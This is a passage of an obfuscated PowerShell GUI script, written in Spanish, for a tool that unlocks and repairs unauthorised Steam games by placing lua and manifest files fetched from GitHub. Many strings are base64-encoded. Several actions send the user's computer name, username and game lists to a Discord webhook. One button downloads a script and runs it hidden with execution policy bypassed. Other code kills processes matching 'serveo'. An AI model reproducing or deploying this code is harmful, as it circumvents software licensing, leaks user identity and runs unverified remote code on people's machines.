            [System.Windows.Forms.MessageBox]::Show("No se pudo iniciar el reparador. Revisa el log en $env:TEMP\bsmap_watcher.log","Error","OK","Error") | Out-Null
        } else {
            Set-ReparadorFlag 1
            [System.Windows.Forms.MessageBox]::Show((S("UmVwYXJhZG9yIGFjdGl2YWRvISBTZSBkZXRlY3RhcmFuIGp1ZWdvcyBhdXRvbWF0aWNhbWVudGUu")),(S("UmVwYXJhZG9yIEFjdGl2YWRv")),"OK","Information") | Out-Null
        }
    }
    $script:sWatcher.Invalidate()
})
$script:sp.Controls.Add($script:sWatcher)


$script:sHist=New-CfgBtn ($sY+58) (T (S("Ym9ycmFySGlzdA=="))) (T (S("Ym9ycmFySGlzdFN1Yg=="))) {
    if ([System.Windows.Forms.MessageBox]::Show("Se eliminaran TODOS los codigos del registro (active codes).`nEsto NO borra los juegos instalados.`n`nContinuar?",(S("Qm9ycmFyIGhpc3RvcmlhbA==")),"YesNo","Warning") -ne "Yes") { return }
    
    $script:activeCodes.Clear()
    
    St7Xb @()
    
    try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -Force -ErrorAction SilentlyContinue } catch {}
    
    try { Remove-Item -Path $HISTORY_FILE -Force -ErrorAction SilentlyContinue } catch {}
    
    RfC
    $script:rp.Invalidate()
    $script:clp.Invalidate()
    [System.Windows.Forms.Application]::DoEvents()
    
    $remaining = At5Vc
    if ($remaining.Count -gt 0) {
        
        St7Xb @()
        $script:activeCodes.Clear()
        try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -Force -ErrorAction SilentlyContinue } catch {}
    }
    RfC
    $script:rp.Invalidate()
    [System.Windows.Forms.MessageBox]::Show((T "histBorradoMsg"),(T "histBorrado"),"OK","Information")
}
$script:sp.Controls.Add($script:sHist)


$script:sKill=New-CfgBtn ($sY+116) (T "limpieza") (T (S("bGltcGllemFTdWI="))) {
    if ([System.Windows.Forms.MessageBox]::Show("LIMPIEZA TOTAL`n`n-Se eliminara el historial de codigos activos`n-Se restablecera el estado interno del programa`n-Se detendran y reiniciaran los servicios del programa`n`nContinuar?",(S("TElNUElFWkE=")),"YesNo","Warning") -ne "Yes") { return }
    
    $steamRoot = Get-SteamPath
    $allLibs = @($steamRoot)
    try { $allLibs = Ss3Jd } catch {}
    $cleanDirs = @((S("Y29uZmlnXHN0cGx1Zy1pbg==")), (S("Y29uZmlnXGx1YQ==")), "config\depotcache")
    $cleanupScript = {
        param($libs, $dirs)
        function Remove-OneHard([string]$p) {
            if ([string]::IsNullOrEmpty($p)) { return }
            try { if (Test-Path -LiteralPath $p) { [System.IO.File]::SetAttributes($p, [System.IO.FileAttributes]::Normal) } } catch {}
            try { if (Test-Path -LiteralPath $p) { Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue } } catch {}
            if (Test-Path -LiteralPath $p) { try { [System.IO.File]::Delete($p) } catch {} }
            if (Test-Path -LiteralPath $p) { try { [System.IO.File]::SetAttributes($p, [System.IO.FileAttributes]::Normal); Remove-Item -LiteralPath $p -Force -ErrorAction Stop } catch {} }
        }
        $removed = 0
        foreach ($lib in @($libs)) {
            if (-not $lib) { continue }
            foreach ($cd in @($dirs)) {
                $dir = Join-Path $lib $cd
                if (-not (Test-Path -LiteralPath $dir)) { continue }
                try {
                    foreach ($f in @(Get-ChildItem -LiteralPath $dir -File -ErrorAction SilentlyContinue)) {
                        $before = Test-Path -LiteralPath $f.FullName
                        Remove-OneHard $f.FullName
                        if ($before -and -not (Test-Path -LiteralPath $f.FullName)) { $removed++ }
                    }
                } catch {}
            }
        }
        return $removed
    }
    $totalRemoved = 0
    try { $totalRemoved = [int](Invoke-PsBlockingDoEvents $cleanupScript @($allLibs, $cleanDirs)) } catch { $totalRemoved = 0 }
    
    try { if ($script:cdT) { $script:cdT.Stop(); $script:cdT.Dispose(); $script:cdT = $null } } catch {}
    try { if ($script:rfT) { $script:rfT.Stop(); $script:rfT.Dispose(); $script:rfT = $null } } catch {}
    
    if ($script:watcherProcess -and -not $script:watcherProcess.HasExited) { try { $script:watcherProcess.Kill(); $script:watcherProcess.WaitForExit(3000) } catch {} }
    $script:watcherProcess = $null; $script:watcherEnabled = $false; Set-ReparadorFlag 0
    
    try {
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match (S("YnNtYXBfd2F0Y2hlcnxic21hcF9yZXBhcmFkb3I=")) } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "serveo" } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq (S("YnNtYXBfd2F0Y2guZXhl")) -or $_.CommandLine -match (S("YnNtYXBfd2F0Y2g=")) } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
        
        try { Disable-ScheduledTask -TaskName (S("QnNtYXBDbGVhbnVw")) -ErrorAction SilentlyContinue } catch {}
    } catch {}
    
    if ($script:fixJobs) { foreach ($j in $script:fixJobs.Values) { try { if ($j.job) { Stop-Job $j.job -ErrorAction SilentlyContinue; Remove-Job $j.job -Force -ErrorAction SilentlyContinue } } catch {} } }
    try { if ($script:fixesJob) { Stop-Job $script:fixesJob -ErrorAction SilentlyContinue; Remove-Job $script:fixesJob -Force -ErrorAction SilentlyContinue } } catch {}
    if ($script:downloadPendingFixes) { foreach ($d in $script:downloadPendingFixes.Values) { try { if ($d.dlJob) { Stop-Job $d.dlJob -ErrorAction SilentlyContinue; Remove-Job $d.dlJob -Force -ErrorAction SilentlyContinue } } catch {} } }
    
    St7Xb @()
    $script:activeCodes.Clear()
    try { Remove-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -Path $HISTORY_FILE -Force -ErrorAction SilentlyContinue } catch {}
    try { Remove-Item -LiteralPath $script:LOTEQ_FILE -Force -ErrorAction SilentlyContinue } catch {}
    $script:cdCode=$null; $script:cdPaused=$false; $script:cdRunning=$false; $script:clpGroups=@()
    try { if($script:cdp){ $script:cdp.Visible=$false } } catch {}
    
    $remaining = At5Vc
    if ($remaining.Count -gt 0) { St7Xb @(); $script:activeCodes.Clear() }
    
    try { Enable-ScheduledTask -TaskName (S("QnNtYXBDbGVhbnVw")) -ErrorAction SilentlyContinue } catch {}
    
    ScA; RfC; $script:rp.Invalidate(); $script:sWatcher.Invalidate()
    [System.Windows.Forms.Application]::DoEvents()
    [System.Windows.Forms.MessageBox]::Show("Limpieza completada.`n- Historial de codigos eliminado`n- Servicios internos reiniciados",(S("TElNUElFWkEgQ09NUExFVEFEQQ==")),"OK","Information")
}
$script:sp.Controls.Add($script:sKill)


$script:sPatch=New-CfgBtn ($sY+174) "Solucionar activacion" "Si tienes un problema con la activacion, presiona aqui" {
    if ([System.Windows.Forms.MessageBox]::Show("Si tienes un problema con la activacion, este boton lo solucionara.`nSe pedira permiso de admin si es necesario y Steam se reiniciara.`n`nContinuar?","Solucionar activacion","YesNo","Information") -ne "Yes") { return }
    [System.Windows.Forms.Application]::DoEvents()
    $ok = Xz9Qk
    if ($ok) { [System.Windows.Forms.MessageBox]::Show("Activacion reparada. Steam se esta abriendo.","Solucionar activacion","OK","Information") }
    else { [System.Windows.Forms.MessageBox]::Show("No se pudo reparar la activacion. Verifica tu conexion o revisa el log.","Solucionar activacion","OK","Error") }
}
$script:sp.Controls.Add($script:sPatch)

$script:sDelGame=New-CfgBtn ($sY+232) "Eliminar juego/juegos" "Elige que juegos borrar por nombre" {
    try {
        $luas=@(); $srTmp=$null; try { $srTmp=Get-SteamPath } catch {}
        try { $luas+=@(Get-ChildItem (Join-Path $srTmp (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) -Filter *.lua -ErrorAction SilentlyContinue | Select-Object -ExpandProperty BaseName) } catch {}
        try { $luas+=@(Get-ChildItem (Join-Path $srTmp (S("Y29uZmlnXGx1YQ=="))) -Filter *.lua -ErrorAction SilentlyContinue | Select-Object -ExpandProperty BaseName) } catch {}
        $luas=$luas | Sort-Object -Unique
        if (-not $luas -or $luas.Count -eq 0) { [System.Windows.Forms.MessageBox]::Show("No hay juegos instalados para borrar.","Eliminar juego","OK","Information"); return }
        $instM=$null; try { $instM=Get-InstallFolderMap } catch {}
        $allRows=New-Object System.Collections.ArrayList
        foreach ($lid in $luas) {
            $mf=@(); try { $mf=@(Get-ChildItem (Join-Path $srTmp "config\depotcache") -Filter "$lid*.manifest" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name) } catch {}
            $nm=Get-GameNameByAppId $lid
            if ($nm -eq $lid -and $instM -and $instM.ContainsKey($lid)) { $nm=$instM[$lid] }
            [void]$allRows.Add([PSCustomObject]@{ AppId="$lid"; Name="$nm"; Timer=@{game_name=$lid; lua_files=@("$lid.lua"); manifest_files=@($mf); steam_root=$srTmp} })
        }
        $allRows=@($allRows | Sort-Object Name)
        $formDel=New-Object System.Windows.Forms.Form
        $formDel.Text="Eliminar juegos"; $formDel.ClientSize=New-Object System.Drawing.Size(500,520)
        $formDel.StartPosition="CenterParent"; $formDel.FormBorderStyle="FixedSingle"
        $formDel.MaximizeBox=$false; $formDel.MinimizeBox=$false; $formDel.BackColor=$script:BG
        try { $formDel.Icon=$form.Icon } catch {}
        $lblDel=New-Object System.Windows.Forms.Label
        $lblDel.Text="Busca por nombre y marca los juegos a borrar:"; $lblDel.Font=$script:FntCard
        $lblDel.ForeColor=$script:White; $lblDel.BackColor=$script:BG
        $lblDel.Location=New-Object System.Drawing.Point(12,12); $lblDel.AutoSize=$true
        $formDel.Controls.Add($lblDel)
        $txtSearch=New-Object System.Windows.Forms.TextBox
        $txtSearch.Location=New-Object System.Drawing.Point(12,40); $txtSearch.Size=New-Object System.Drawing.Size(460,26)
        $txtSearch.BackColor=$script:InputBG; $txtSearch.ForeColor=$script:White; $txtSearch.BorderStyle="FixedSingle"
        $txtSearch.Font=$script:FntCard
        $formDel.Controls.Add($txtSearch)
        $lvDel=New-Object System.Windows.Forms.ListView
        $lvDel.Location=New-Object System.Drawing.Point(12,74); $lvDel.Size=New-Object System.Drawing.Size(460,356)
        $lvDel.View="Details"; $lvDel.CheckBoxes=$true; $lvDel.FullRowSelect=$true
        $lvDel.BackColor=$script:InputBG; $lvDel.ForeColor=$script:White; $lvDel.BorderStyle="FixedSingle"
        $lvDel.HeaderStyle="None"
        [void]$lvDel.Columns.Add("Juego",436)
        $rebuildDel={
            $q=($txtSearch.Text).Trim()
            $qNorm=Nn1Yw $q
            $isNum=($q -match '^\d+$')
            $prev=@{}
            foreach ($vi in @($lvDel.Items)) { if ($vi.Checked) { $prev[[string]$vi.Tag.AppId]=$true } }
            $lvDel.BeginUpdate(); $lvDel.Items.Clear()
            foreach ($row in $allRows) {
                if ($qNorm) {
                    if ($isNum) { if (-not ($row.AppId -like "*$q*")) { continue } }
                    else {
                        $nmN=Nn1Yw $row.Name
                        if (-not ($nmN -like "*$qNorm*" -or $qNorm -like "*$nmN*")) { continue }
                    }
                }
                $ni=New-Object System.Windows.Forms.ListViewItem([string]$row.Name)
                $ni.Tag=$row
                if ($prev.ContainsKey([string]$row.AppId)) { $ni.Checked=$true }
                [void]$lvDel.Items.Add($ni)
            }
            $lvDel.EndUpdate()
        }
        $txtSearch.Add_TextChanged({ try { & $rebuildDel } catch {} })
        & $rebuildDel
        $btnOk=New-Object System.Windows.Forms.Button
        $btnOk.Text="Borrar seleccionados"; $btnOk.Location=New-Object System.Drawing.Point(12,444); $btnOk.Size=New-Object System.Drawing.Size(220,32)
        $btnOk.BackColor=$script:Red; $btnOk.ForeColor=[System.Drawing.Color]::White; $btnOk.FlatStyle="Flat"; $btnOk.FlatAppearance.BorderSize=0; $btnOk.Font=$script:FntCard; $btnOk.Cursor=[System.Windows.Forms.Cursors]::Hand
        $btnCancel=New-Object System.Windows.Forms.Button
        $btnCancel.Text="Cancelar"; $btnCancel.Location=New-Object System.Drawing.Point(252,444); $btnCancel.Size=New-Object System.Drawing.Size(220,32)
        $btnCancel.BackColor=$script:CardBG; $btnCancel.ForeColor=$script:White; $btnCancel.FlatStyle="Flat"; $btnCancel.FlatAppearance.BorderSize=0; $btnCancel.Font=$script:FntCard; $btnCancel.Cursor=[System.Windows.Forms.Cursors]::Hand
        $btnCancel.Add_Click({ $formDel.DialogResult=[System.Windows.Forms.DialogResult]::Cancel; $formDel.Close() })
        $btnOk.Add_Click({
            $sel=@($lvDel.CheckedItems)
            if ($sel.Count -eq 0) { [System.Windows.Forms.MessageBox]::Show("Selecciona al menos un juego.","Eliminar juego","OK","Warning"); return }
            if ([System.Windows.Forms.MessageBox]::Show("Se borraran $($sel.Count) juegos. Se hara backup en %LOCALAPPDATA%\BastissSteam\backup y se notificara a Discord.`n`nContinuar?","Eliminar juego","YesNo","Warning") -ne "Yes") { return }
            $selNames=@($sel | ForEach-Object { [string]$_.Text })
            $backupRoot=Join-Path $env:LOCALAPPDATA "BastissSteam\backup\manual_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$([guid]::NewGuid().ToString('N').Substring(0,6))"
            try { New-Item -ItemType Directory -Path $backupRoot -Force | Out-Null } catch {}
            $borrados=0
            $selLuas=@()
            foreach ($it2 in $sel) {
                $t=$it2.Tag.Timer; $root=$t.steam_root; if (-not $root) { try { $root=Get-SteamPath } catch {} }
                foreach ($lf in @($t.lua_files)) { $selLuas += [string]$lf }
                foreach ($f in @($t.lua_files)) {
                    $p1=Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f; $p2=Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f
                    try { if (Test-Path -LiteralPath $p1) { Copy-Item -LiteralPath $p1 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}
                    try { if (Test-Path -LiteralPath $p2) { Copy-Item -LiteralPath $p2 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}
                    Remove-FileHard $p1; Remove-FileHard $p2
                }
                foreach ($f in @($t.manifest_files)) { $p3=Join-Path (Join-Path $root "config\depotcache") $f; try { if (Test-Path -LiteralPath $p3) { Copy-Item -LiteralPath $p3 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}; Remove-FileHard $p3 }
                $borrados++
            }
            try {
                $remain=@(At5Vc | Where-Object { $keep=$true; foreach ($lf in @($_.lua_files)) { if ($selLuas -contains [string]$lf) { $keep=$false; break } }; $keep })
                St7Xb $remain
                $script:activeCodes.Clear()
                foreach ($x in @(At5Vc)) { try { $script:activeCodes.Add(@{Code=$x.redeem_code;Game=$x.game_name;ActivatedAt=(Get-Date);ExpiresAt=($x.expires_at -as [datetime]);Duration=$x.duration;InternetCreatedAt=$x.internet_created_at}) | Out-Null } catch {} }
                $script:rp.Invalidate(); RfC
            } catch {}
            try { $content="**BORRADO MANUAL:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Juegos:** $($selNames -join ', ')`n**Backup:** $backupRoot`n**Borrados:** $borrados"; $payload=@{content=$content}|ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {}
            [System.Windows.Forms.MessageBox]::Show("Se borraron $borrados juegos. Backup en $backupRoot","Eliminar juego","OK","Information")
            $formDel.DialogResult=[System.Windows.Forms.DialogResult]::OK; $formDel.Close()
        })
        $formDel.Controls.Add($lvDel); $formDel.Controls.Add($btnOk); $formDel.Controls.Add($btnCancel)
        $formDel.ShowDialog() | Out-Null; $formDel.Dispose()
    } catch { WEL "Eliminar juego" $_; [System.Windows.Forms.MessageBox]::Show("Error: $($_.Exception.Message)","Eliminar juego","OK","Error") }
}
$script:sp.Controls.Add($script:sDelGame)


$script:sEliminar=New-CfgBtn ($sY+290) "Eliminar activacion" "Borra la activacion" {
    if ([System.Windows.Forms.MessageBox]::Show("Seguro que quieres eliminar la activacion de esta PC?`n`nEsta accion es permanente.","Eliminar activacion","YesNo","Warning") -ne "Yes") { return }
    $n=Invoke-EliminarActivacion
    [System.Windows.Forms.MessageBox]::Show("Activacion eliminada.","Eliminar activacion","OK","Information")
    $script:sp.Invalidate()
} $script:Red
$script:sp.Controls.Add($script:sEliminar)


$script:sActualizar=New-CfgBtn ($sY+348) "Actualizar app" "Descarga la ultima version y la aplica" {
    try {
        $script:sVer.Text="Actualizando..."; [System.Windows.Forms.Application]::DoEvents()
        $r=Invoke-ActualizarApp
        try { $script:sVer.Text=$script:version } catch {}
        if ($r) { [System.Windows.Forms.MessageBox]::Show($r,"Actualizar app","OK","Information") }
    } catch {
        try { $script:sVer.Text=$script:version } catch {}
        [System.Windows.Forms.MessageBox]::Show("Fallo al actualizar: $($_.Exception.Message)","Actualizar app","OK","Error")
    }
    $script:sp.Invalidate()
}
$script:sp.Controls.Add($script:sActualizar)


$script:sMigrar=New-CfgBtn ($sY+58) "Migrar" "Presiona para migrar" {
    if ([System.Windows.Forms.MessageBox]::Show("Listo, migrando...","Migrar","YesNo","Information") -ne "Yes") { return }
    [System.Windows.Forms.Application]::DoEvents()
    $errs=@()
    $patchOk=$false
    try { $patchOk=Xz9Qk -Silent } catch { $patchOk=$false; $errs+=("Parche: "+$_.Exception.Message) }
    $libs=@()
    try { $libs=@(Ss3Jd) } catch {}
    if (-not $libs -or $libs.Count -eq 0) { try { $libs=@(Get-SteamPath) } catch { $errs+=("Steam: "+$_.Exception.Message) } }
    $libs=$libs | Where-Object { $_ } | Sort-Object -Unique
    if ($libs.Count -eq 0) {
        try { $pl=@{content="**MIGRAR FALLO:** $env:COMPUTERNAME / $([Environment]::UserName)`nNo se encontro Steam.`n$($errs -join "`n")"}|ConvertTo-Json; Send-DiscordJson $WEBHOOK_URL $pl 10 | Out-Null } catch {}
        [System.Windows.Forms.MessageBox]::Show("Algo salio mal, intenta de nuevo mas tarde.","Migrar","OK","Warning"); return
    }
    $gtotal=0; $gok=0; $gcreadas=@(); $gdetalle=@()
    foreach ($srM in $libs) {
        $srcDir=Join-Path $srM "config\stplug-in"; $dstDir=Join-Path $srM "config\lua"
        $dstOk=$false
        if (Test-Path -LiteralPath $dstDir) { $dstOk=$true }
        else { try { New-Item -ItemType Directory -Path $dstDir -Force -ErrorAction Stop | Out-Null; $dstOk=Test-Path -LiteralPath $dstDir; if($dstOk){$gcreadas+=$dstDir} } catch { $errs+=("Crear ${dstDir}: "+$_.Exception.Message) } }
        if (-not $dstOk) { $gdetalle+=("${srM}: no se pudo crear lua"); continue }
        $luas=@()
        if (Test-Path -LiteralPath $srcDir) { try { $luas=@(Get-ChildItem -LiteralPath $srcDir -Filter *.lua -File -ErrorAction Stop) } catch { $errs+=("Leer ${srcDir}: "+$_.Exception.Message) } }
        else { $gdetalle+=("${srM}: sin stplug-in") }
        foreach ($l in $luas) {
            $gtotal++
            try { $dest=Join-Path $dstDir $l.Name; Copy-Item -LiteralPath $l.FullName -Destination $dest -Force -ErrorAction Stop; if ((Test-Path -LiteralPath $dest) -and ((Get-Item -LiteralPath $dest).Length -eq $l.Length)) { $gok++ } else { $errs+=("Verificar $($l.Name)") } } catch { $errs+=($l.Name+": "+$_.Exception.Message) }
        }
        $gdetalle+=("${srM}: $($luas.Count) luas")
    }
    $estado=if($patchOk){"INSTALADO"}else{"FALLO"}
    try {
        $bt=[char]96
        $content="**MIGRAR:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Parche:** $estado`n**Migrados:** $gok de $gtotal`n**Carpetas lua creadas:** $($gcreadas.Count)`n**Detalle:**`n$($gdetalle -join "`n")"
        if ($errs.Count -gt 0) { $errText=($errs | Select-Object -First 10) -join "`n"; $content+="`n**Errores:**`n$bt$bt$bt`n$errText`n$bt$bt$bt" }
        $pl=@{content=$content}|ConvertTo-Json
        Send-DiscordJson $WEBHOOK_URL $pl 10 | Out-Null
    } catch {}
    if ($patchOk -and $errs.Count -eq 0 -and $gok -eq $gtotal) { [System.Windows.Forms.MessageBox]::Show("Listo, migrado correctamente.","Migrar","OK","Information") }
    else { [System.Windows.Forms.MessageBox]::Show("Algo salio mal, intenta de nuevo mas tarde.","Migrar","OK","Warning") }
}
$script:sp.Controls.Add($script:sMigrar)


$script:sFixDl=New-CfgBtn ($sY+116) "Arreglar descarga" "Quita los manifests y arregla el error Sin conexion" {
    [System.Windows.Forms.Application]::DoEvents()
    $srTmp=$null; try { $srTmp=Get-SteamPath } catch {}
    if (-not $srTmp) { [System.Windows.Forms.MessageBox]::Show("Algo salio mal, intenta de nuevo mas tarde.","Solucionar descarga","OK","Warning"); return }
    $dirs=@((Join-Path $srTmp "config\stplug-in"),(Join-Path $srTmp "config\lua"))
    $apps=@()
    foreach ($d in $dirs) { if (Test-Path -LiteralPath $d) { try { $apps+=@(Get-ChildItem -LiteralPath $d -Filter *.lua -ErrorAction SilentlyContinue | ForEach-Object { $_.BaseName }) } catch {} } }
    $apps=@($apps | Sort-Object -Unique)
    if ($apps.Count -eq 0) { [System.Windows.Forms.MessageBox]::Show("Algo salio mal, intenta de nuevo mas tarde.","Solucionar descarga","OK","Warning"); return }
    if ([System.Windows.Forms.MessageBox]::Show("Se van a arreglar las descargas de $($apps.Count) juegos.`n`nContinuar?", "Arreglar descarga", "YesNo", "Information") -ne "Yes") { return }
    $progForm=New-Object System.Windows.Forms.Form; $progForm.Text="Arreglar descarga"; $progForm.Size=New-Object System.Drawing.Size(420,140); $progForm.StartPosition="CenterParent"; $progForm.FormBorderStyle="FixedDialog"; $progForm.MaximizeBox=$false; $progForm.MinimizeBox=$false; $progForm.BackColor=$BG; $progForm.TopMost=$true
    $progLbl=New-Object System.Windows.Forms.Label; $progLbl.Location=New-Object System.Drawing.Point(16,16); $progLbl.Size=New-Object System.Drawing.Size(380,20); $progLbl.ForeColor=$White; $progLbl.BackColor=$BG; $progLbl.Text="Iniciando..."; $progForm.Controls.Add($progLbl)
    $progBar=New-Object System.Windows.Forms.ProgressBar; $progBar.Location=New-Object System.Drawing.Point(16,44); $progBar.Size=New-Object System.Drawing.Size(380,22); $progBar.Minimum=0; $progBar.Maximum=$apps.Count; $progBar.Value=0; $progBar.Style="Continuous"; $progForm.Controls.Add($progBar)
    $progSub=New-Object System.Windows.Forms.Label; $progSub.Location=New-Object System.Drawing.Point(16,74); $progSub.Size=New-Object System.Drawing.Size(380,16); $progSub.ForeColor=$script:Gray; $progSub.Font=$script:FntSub; $progSub.BackColor=$BG; $progSub.Text="0 / $($apps.Count)"; $progForm.Controls.Add($progSub)
    $progForm.Show(); [System.Windows.Forms.Application]::DoEvents()
    $manDir=Join-Path $srTmp "config\depotcache"; $luaDir=Join-Path $srTmp "config\stplug-in"; $luaDir2=Join-Path $srTmp "config\lua"
    foreach ($d in @($manDir,$luaDir,$luaDir2)) { if (-not (Test-Path -LiteralPath $d)) { try { New-Item -ItemType Directory -Path $d -Force | Out-Null } catch {} } }
    $throttle=[Math]::Min(16,$apps.Count); [System.Net.ServicePointManager]::DefaultConnectionLimit=100
    $pool=[runspacefactory]::CreateRunspacePool(1,$throttle); $pool.Open()
    $sbBase="https://raw.githubusercontent.com/SPIN0ZAi/SB_manifest_DB"; $sbCdn="https://cdn.jsdelivr.net/gh/SPIN0ZAi/SB_manifest_DB"
    $jobs=@(); $okCount=0; $failCount=0; $fails=@()
    foreach ($appid in $apps) {
        $ps=[powershell]::Create(); $ps.RunspacePool=$pool
        [void]$ps.AddScript({
            param($appid,$sbBase,$sbCdn,$luaDir,$luaDir2,$manDir)
            $tmp=Join-Path $env:TEMP "sb_$appid`_$(Get-Random)"
            try { New-Item -ItemType Directory -Path $tmp -Force | Out-Null } catch { return @{ok=$false; appid=$appid} }
            $luaOk=$false; $manCount=0
            try {
                $wc=New-Object System.Net.WebClient; $txt=$null
                for ($r=0; $r -lt 2 -and -not $txt; $r++) {
                    try { $txt=$wc.DownloadString("$sbCdn@$appid/$appid.lua") } catch {}
                    if (-not $txt) { try { $txt=$wc.DownloadString("$sbBase/$appid/$appid.lua") } catch {} }
                    if (-not $txt) { Start-Sleep -Milliseconds 400 }
                }
                if ($txt -and $txt -match "addappid") { [IO.File]::WriteAllText((Join-Path $tmp "$appid.lua"), $txt); $luaOk=$true }
                $wc.Dispose()
                if ($luaOk) {
                    try { Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir "$appid.lua") -Force; Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir2 "$appid.lua") -Force } catch {}
                    $ids=@([regex]::Matches($txt,'setManifestid\((\d+),\s*"(\d+)"') | ForEach-Object { "$($_.Groups[1].Value)_$($_.Groups[2].Value).manifest" }) | Select-Object -Unique
                    foreach ($m in $ids) {
                        $destMan=Join-Path $manDir $m
                        if ((Test-Path -LiteralPath $destMan) -and ((Get-Item -LiteralPath $destMan).Length -gt 500)) { $manCount++; continue }
                        try { $wc2=New-Object System.Net.WebClient; $dst2=Join-Path $tmp $m; try { $wc2.DownloadFile("$sbCdn@$appid/$m",$dst2) } catch { $wc2.DownloadFile("$sbBase/$appid/$m",$dst2) }; $wc2.Dispose(); if ((Test-Path $dst2) -and ((Get-Item $dst2).Length -gt 100)) { Copy-Item -LiteralPath $dst2 -Destination $destMan -Force; $manCount++ } } catch {}
                    }
                    if ($ids.Count -eq 0) { $manCount=1 }
                }
            } catch {}
            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
            return @{ok=$luaOk; appid=$appid; man=$manCount}
        }).AddArgument($appid).AddArgument($sbBase).AddArgument($sbCdn).AddArgument($luaDir).AddArgument($luaDir2).AddArgument($manDir)
        $h=$ps.BeginInvoke(); $jobs+=@{ps=$ps; handle=$h; appid=$appid}
    }
    while (@($jobs | Where-Object { -not $_.handle.IsCompleted }).Count -gt 0) {
        $cDone=@($jobs | Where-Object { $_.handle.IsCompleted }).Count
        $progLbl.Text="Reparando... $cDone/$($apps.Count)"; try { $progBar.Value=[Math]::Min($cDone,$apps.Count) } catch {}; $progSub.Text="$cDone / $($apps.Count)"; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 150
    }
    foreach ($j in $jobs) {
        try { $r=$j.ps.EndInvoke($j.handle); if ($r -and $r.ok) { $okCount++ } else { $failCount++; if($fails.Count -lt 10){ $fails+=$j.appid } } } catch { $failCount++; if($fails.Count -lt 10){ $fails+=$j.appid } }
        try { $j.ps.Dispose() } catch {}
    }
    $pool.Close(); $pool.Dispose()
    $progBar.Value=$apps.Count; $progLbl.Text="Completado $okCount/$($apps.Count)"; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 400
    $progForm.Close(); $progForm.Dispose()
    try { $content="**ARREGLAR DESCARGA (con manifests):** $env:COMPUTERNAME / $([Environment]::UserName)`n**Total:** $($apps.Count)`n**OK:** $okCount`n**Fallos:** $failCount`n$(if($fails.Count -gt 0){'**Ej fallos:** '+($fails -join ', ')}else{''})"; $pl=@{content=$content}|ConvertTo-Json; Send-DiscordJson $WEBHOOK_URL $pl 10 | Out-Null } catch {}
    [System.Windows.Forms.MessageBox]::Show("Listo, descarga reparada.","Arreglar descarga","OK","Information")
}
$script:sp.Controls.Add($script:sFixDl)


$script:sLuaTools=New-CfgBtn ($sY+174) "Reparar juegos" "Arregla los juegos que no descargan (manifests)" {
    try {
        $baseLocalR=$env:LOCALAPPDATA; if([string]::IsNullOrWhiteSpace($baseLocalR)){ $baseLocalR=Join-Path $env:USERPROFILE "AppData\Local" }
        $luatoolsPath=$null; if(-not [string]::IsNullOrWhiteSpace($PSScriptRoot)){ $luatoolsPath=Join-Path $PSScriptRoot "repair_luatools.ps1" }
        if([string]::IsNullOrWhiteSpace($luatoolsPath) -or -not (Test-Path $luatoolsPath)){ $luatoolsPath=Join-Path $baseLocalR "BastissSteam\repair_luatools.ps1" }
        if (-not (Test-Path $luatoolsPath)) {
            try {
              $dirR=Split-Path $luatoolsPath; if([string]::IsNullOrWhiteSpace($dirR)){$dirR=$baseLocalR}
              New-Item -ItemType Directory -Path $dirR -Force | Out-Null
              Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/repair_luatools.ps1" -OutFile $luatoolsPath -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
            } catch {}
        }
        if (-not (Test-Path $luatoolsPath)) { [System.Windows.Forms.MessageBox]::Show("No se pudo obtener el archivo de reparacion. Revisa tu internet.","Reparar juegos","OK","Warning") | Out-Null; return }
        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$luatoolsPath) -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}
$script:sp.Controls.Add($script:sLuaTools)

$script:autoLuaWatcherProcess=$null
$script:autoLuaWatcherEnabled=$false
try { $v=Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name AutoLuaWatcher -ErrorAction SilentlyContinue; if($v -ne $null){ $script:autoLuaWatcherEnabled=[bool][int]$v.AutoLuaWatcher } } catch {}
$script:sAutoLua=New-BufferedPanel
$script:sAutoLua.Location=New-Object System.Drawing.Point($PAD,($sY+116))
$script:sAutoLua.Size=New-Object System.Drawing.Size($CW,50);$script:sAutoLua.BackColor=$BG
$script:sAutoLua.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sAutoLua.Tag=@{Hover=$false}
